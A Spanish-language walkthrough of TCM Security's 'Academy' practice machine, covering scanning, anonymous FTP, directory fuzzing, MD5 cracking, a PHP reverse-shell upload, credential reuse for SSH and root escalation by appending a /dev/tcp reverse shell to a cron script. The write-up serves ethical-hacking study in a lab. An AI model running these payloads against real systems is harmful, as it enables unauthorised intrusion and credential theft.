---
title: Academy - Practical Ethical Hacking
categories: [Linux, FTP, SSH, HTTP, Wfuzz, Hashcat, PHP, Reverse Shell, Cron Jobs, Privilege Escalation]
published: true
lang: es
---

![Info Card](http://192.168.92.128/1.png){:class="blog-image" onclick="expandImage(this)"}

Hoy vamos a resolver la máquina _Academy_ del curso [Practical Ethical Hacking](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course) de TCM Security. Esta máquina forma parte del capstone intermedio del curso, y en este write-up me enfocaré en cubrir varias técnicas de explotación y escalada de privilegios, desde el reconocimiento inicial hasta la obtención de privilegios de administrador.

El objetivo de este artículo es reforzar lo aprendido hasta ahora, pero también ofrecer una guía más completa, explorando distintos enfoques y metodologías que podrían ser útiles para quienes buscan profundizar más en el proceso.

### [](#header-3)Fase de Reconocimiento

Primeramente vamos a lanzar una _traza ICMP_ para saber si la máquina está activa.

```
ping -c 1 <IP del host>
```

![2](http://192.168.92.128/2.png){:class="blog-image" onclick="expandImage(this)"}

Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del _TTL_; en este caso el valor del _TTL_ de la máquina es `64`, por lo que podemos intuir que estamos ante una máquina _Linux_. Recordemos que algunos de los valores referenciales son los siguientes:

| Sistema Operativo (OS) | TTL |
|:-----------------------|:----|
| Linux                  | 64  |
| Windows                | 128 |
| Solaris                | 254 |

Posteriormente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:

```bash
nmap -p- --open -T5 -v -n <IP del host>
```

En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP del host>
```

A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-p\- | Escanea todo el rango de puertos (65535 en total) |
| \-\-open | Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) |
| \-T5 | La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, "generaremos más ruido", pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos `White Hat` |
| \-v | _Verbose_, reporta lo encontrado por consola |
| \-n | No aplicar _resolución DNS_ |
| \-sS | Escaneo _TCP SYN_ |
| \-min-rate | Emitir paquetes no más lentos que \<valor\> por segundo |
| \-vvv | Triple _verbose_, para obtener mayor información por consola |
| \-Pn | No aplicar _host discovery_ |

Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.

```bash
nmap -sC -sV -p 21,22,80 <IP del host>
```

A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-sC | Scripts básicos de enumeración |
| \-sV | Versión y servicios que corren bajo los puertos encontrados |
| \-p | Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) |

Basándonos en la información que nos reporta _Nmap_, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con `FTP` (21), `SSH` (22) y `HTTP` (80).

#### [](#header-4)Servicio FTP

Podemos empezar por enumerar el servicio `FTP`, ya que el acceso anónimo se encuentra habilitado como nos muestra nuestro escaneo de versiones y servicios con _Nmap_.

![3](http://192.168.92.128/3.png){:class="blog-image" onclick="expandImage(this)"}

Esto nos permite autenticarnos sin disponer de credenciales válidas e inspeccionar el contenido disponible en el servidor.

```bash
ftp anonymous@<IP del host>
```

Una vez dentro, podemos listar los archivos existentes. Entre ellos encontraremos un archivo `note.txt` que resulta especialmente interesante, por lo que procederemos a descargarlo en nuestra máquina.

```bash
ls
get note.txt
```

![4](http://192.168.92.128/4.png){:class="blog-image" onclick="expandImage(this)"}

Al revisar el contenido del archivo, encontramos información relacionada con una consulta a una base de datos, incluyendo un identificador de estudiante y un contraseña hasheada.

![5](http://192.168.92.128/5.png){:class="blog-image" onclick="expandImage(this)"}

No obstante, por el momento no contamos con suficiente contexto para explotar esta información, así que procederemos a enumerar el siguiente servicio.

#### [](#header-4)Servicio HTTP

El siguiente servicio que analizaremos será `HTTP`. Una buena forma de comenzar es utilizando `WhatWeb`, una herramienta que se encarga de identificar las tecnologías web que se están utilizando. Esto incluye gestores de contenido (CMS), librerías, plugins, o incluso el sistema operativo en el que se está alojando el servidor web.

```bash
whatweb <IP del host> 
```

![6](http://192.168.92.128/6.png){:class="blog-image" onclick="expandImage(this)"}

Lo primero que resalta es una versión de `Apache` desactualizada. Sin embargo, [tras revisar esta versión](https://www.google.com/search?q=apache+2.4.38+exploit), no encontramos ninguna vulnerabilidad conocida que pueda aprovecharse directamente en este escenario.

```bash
searchsploit apache 2.4.38
```

![7](http://192.168.92.128/7.png){:class="blog-image" onclick="expandImage(this)"}

Otro detalle interesante es que el servidor parece estar mostrando la página por defecto de _Apache_. Esto nos indica que, al menos en la ruta principal del servicio HTTP, no existe contenido que nos aporte información relevante para continuar con la explotación.

![8](http://192.168.92.128/8.png){:class="blog-image" onclick="expandImage(this)"}

Sin embargo, esto no descarta la existencia de directorios o recursos adicionales accesibles desde otras rutas, por lo que el siguiente paso será realizar _fuzzing_ para descubrir rutas adicionales. Personalmente la herramienta que más me gusta utilizar para esta tarea es `Wfuzz`, así que será la que emplearemos en esta ocasión.

```bash
wfuzz -c -L -t 400 --hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://<IP del host>/FUZZ
```

A continuación se explican los parámetros utilizados en el _fuzzeo_ del servidor web:

| Parámetro | Explicación |
|:----------|:------------|
| \-c | Output colorizado |
| \-L | Sigue las redirecciones HTTP (código de estado 403), de modo que conseguimos el código de estado final verdadero |
| \-t | Específicamos el número de hilos con el queremos trabajar |
| \-\-hc | Oculta las respuestas con el código de estado que indiquemos, en este caso los errores (código de estado 404) |
| \-\-hh | Oculta las respuestas con el número de caractéres que indiquemos; esto no es necesario, sin embargo, es útil para descartar respuestas con contenido que vemos que no nos interesan |
| \-w | Especificamos el diccionario con el que queremos trabajar |

![9](http://192.168.92.128/9.png){:class="blog-image" onclick="expandImage(this)"}

El escaneo nos devuelve tres resultados: `server-status`, `phpMyAdmin` y un recurso `academy`.

El primero de ellos corresponde al panel `server-status` de _Apache_. Este recurso suele proporcionar información útil sobre el estado del servidor y las conexiones activas; sin embargo, en este caso el acceso se encuentra restringido, por lo que no podemos obtener información adicional.

Por otro lado, también identificamos un panel `phpMyAdmin`. Esta interfaz se utiliza para la administración de bases de datos de forma remota; no obstante, para poder interactuar con ella es necesario disponer de credenciales válidas.

Por último, el recurso `academy` parece alojar un portal de gestión estudiantil. Al acceder a esta ruta se nos presenta un formulario de autenticación que solicita un número de identificación y una contraseña.

![10](http://192.168.92.128/10.png){:class="blog-image" onclick="expandImage(this)"}

Si hacemos memoria, durante la enumeración del servicio `FTP` obtuvimos precisamente un identificador de estudiante junto con una contraseña asociada. Sin embargo, esta última se encuentra hasheada, por lo que antes de intentar autenticarnos tendremos que identificar el algoritmo utilizado y tratar de recuperar la contraseña en texto claro.

Para identificar el tipo de hash podemos utilizar `hash-identifier`, una herramienta que, a partir de una cadena determinada, propone los algoritmos más probables con los que pudo haberse generado.

```
hash-identifier <hash>
```

![11](http://192.168.92.128/11.png){:class="blog-image" onclick="expandImage(this)"}

En este caso, la herramienta nos indica que el hash corresponde a `MD5`. Si bien este algoritmo fue ampliamente utilizado en el pasado, actualmente se considera criptográficamente inseguro y, en muchos casos, es posible recuperar la contraseña original mediante ataques de diccionario.

Para ello, utilizaremos `John the Ripper`, especificando el formato correspondiente:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![12](http://192.168.92.128/12.png){:class="blog-image" onclick="expandImage(this)"}

Tras recuperar la contraseña en texto claro, ya contamos tanto con el identificador del estudiante como con las credenciales necesarias para acceder al portal.

Una vez autenticados, podemos explorar las distintas funcionalidades que ofrece la aplicación en busca de posibles vectores de ataque. Entre ellas, la que más nos interesa es la sección de perfil, ya que permite subir un archivo para actualizar la foto de perfil del usuario.

![13](http://192.168.92.128/13.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Fase de Explotación

Si la aplicación no valida correctamente el tipo de archivo que se está cargando o permite que el servidor interprete el contenido subido como código, esta funcionalidad podría aprovecharse para conseguir ejecución remota de comandos (RCE). Dado que el servidor utiliza `PHP`, intentaremos aprovechar este mecanismo subiendo una _reverse shell_ escrita en este mismo lenguaje.

Podríamos utilizar una implementación pública ya preparada, como la disponible en [PentestMonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell), que es una versión bastante completa y robusta pensada para este tipo de situaciones. No obstante, en este caso utilizaremos una versión simplificada construida por nosotros mismos.

Existen múltiples formas de implementar una _reverse shell_ en `PHP`, utilizando funciones como `exec()`, `shell_exec`, `system()`, `passthru()`, `popen()` o `proc_open()`. Dependiendo de la configuración del servidor, algunas de ellas pueden encontrarse deshabilitadas o simplemente no comportarse de la manera esperada, por lo que a menudo es necesario probar distintas alternativas. En este escenario concreto, la variante basada en `proc_open()` fue la que resultó funcional. 

```php
<?php
  $s=fsockopen("<IP del host>",443);
  proc_open("sh",[$s,$s,$s],$p);
?>
```

Lo que haremos ahora será tratar de subir este archivo a través del formulario de actualización de imagen de perfil. Si el servidor procesa el contenido como un script `PHP`, bastará con acceder posteriormente al recurso subido mientras estamos en escucha.

Podemos determinar dónde se está almacenando el archivo utilizando las herramientas para desarrolladores del navegador.

![14](http://192.168.92.128/14.png){:class="blog-image" onclick="expandImage(this)"}

Una vez identificada la ruta, nos pondremos en escucha con `Netcat`:

```bash
nc -nlvp 443
```

Finalmente, accederemos al archivo que acabamos de subir. Si el servidor interpreta correctamente el script, recibiremos una shell interactiva como el usuario `www-data`.

![15](http://192.168.92.128/15.png){:class="blog-image" onclick="expandImage(this)"}

Una vez dentro de la máquina, nos interesa aumentar nuestros privilegios, ya que las capacidades del usuario `www-data` suelen ser bastante limitadas.

Podemos empezar por buscar [credenciales almacenadas en el sistema](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#looting-for-passwords), ya sea en archivos de configuración, ficheros sensibles, memoria de procesos o cualquier otro recurso que pueda contener credenciales válidas.

Una forma sencilla de comenzar es realizando una búsqueda recursiva sobre el sistema en busca de cadenas potencialmente relacionadas con contraseñas:

```bash
grep -rni --color=auto "password" / 2>/dev/null
```

El resultado de este comando será bastante extenso, ya que estamos buscando dentro de todo el sistema, por lo que será necesario revisar cuidadosamente las coincidencias obtenidas.

No obstante, como sabemos que estamos frente a una aplicación desarrollada en `PHP`, podemos centrar nuestra atención en el archivo `config.php`, que normalmente almacena parámetros de configuración de la aplicación, incluyendo credenciales de acceso a la base de datos.

![16](http://192.168.92.128/16.png){:class="blog-image" onclick="expandImage(this)"}

Al revisar este archivo encontramos unas credenciales que, aunque inicialmente podrían corresponder únicamente a la base de datos, merece la pena probar en otros servicios. La reutilización de contraseñas es una mala práctica relativamente frecuente y, además, si hacemos memoria, la nota que encontramos durante la fase de enumeración mencionaba precisamente esto:

![17](http://192.168.92.128/17.png){:class="blog-image" onclick="expandImage(this)"}

_"¡Hola, Heath! Grimmie ha configurado la página web de prueba para la nueva academia. Le he dicho que no utilice la misma contraseña en todas partes; la cambiará lo antes posible"_

Se trata de un fuerte indicador de reutilización de credenciales, por lo que intentaremos autenticarnos por `SSH` utilizando las credenciales encontradas:

```bash
ssh grimmie@<IP del host>
```

En este caso, las credenciales también resultan válidas para `SSH`, permitiéndonos obtener una consola interactiva como el usuario `grimmie`.

![18](http://192.168.92.128/18.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Escalada de Privilegios

Una vez dentro como el usuario `grimmie`, nos interesa encontrar vectores para escalar nuestros privilegios y convertirnos en el usuario `root`.

Algo que podemos hacer es revisar tareas programadas, tareas cron. Podemos revisar si nuestro usuario actual tiene algún trabajo cron activo:

```bash
crontab -l
```

![19](http://192.168.92.128/19.png){:class="blog-image" onclick="expandImage(this)"}

No existe ninguna tarea cron. Podemos revisar a nivel de sistema, a lo mejor otro usuario spool si que tiene:

```bash
cat /etc/crontab
```

![20](http://192.168.92.128/20.png){:class="blog-image" onclick="expandImage(this)"}

Encontramos una tarea definida que se ejecuta para un script `backup.sh`. Aquí me gustaría hacer una nota, asumo que al ser esta una máquina para practicar, de manera intencionada con fines didácticos esta tarea cron fue escrita de esta manera. Ya que para escribir tareas en el `/etc/crontab` tiene un formato específico:

How often or exactly when the task should run, What user account should execute it, What command

Y en este caso eso es lo que falta, falta el usuario, la tarea está mal escrita (* * * * * /home/grimmie/backup.sh) y como veremos más adelante en el journalctl esta tarea está siendo ignorada. Así que supongo que esto está diseñado para descubrir que existe una tarea cron, que algún otro usuario está corriendo, y por descarte tiene que ser root ya que son los dos únicos usuarios en el sistema:

grep -E 'sh$' /etc/passwd

![21](http://192.168.92.128/21.png){:class="blog-image" onclick="expandImage(this)"}

Hecho este comentarios echemos un ojo a `backup.sh`: borra cualquier backup previo, crea un nuevo archivo ZIP con el contenido de /var/www/html/academy/includes en /tmp/backup.zip, y luego le asigna permisos de lectura, escritura y ejecución solo al propietario.

Como somos el propietario de este archivo podemos modificarlo y reemplazar su contenido, por ejemplo, por una _reverse shell_ que apunte a nuestra máquina atacante. Ya que este será ejecutado bajo el contexto de `root` se nos otorgará una consola con máximos privilegios.

Por ejemplo, podemos añadir esto al final de `backup.sh`

```bash
bash -i >& /dev/tcp/<IP local>/4444 0>&1
```

Guardamos el archivo y, en nuestra máquina, finalmente, nos ponemos en escucha:

```bash
nc -nlvp 4444
```

Cuando `cron` ejecute nuevamente el script, recibiremos la conexión y obtendremos una shell como `root`.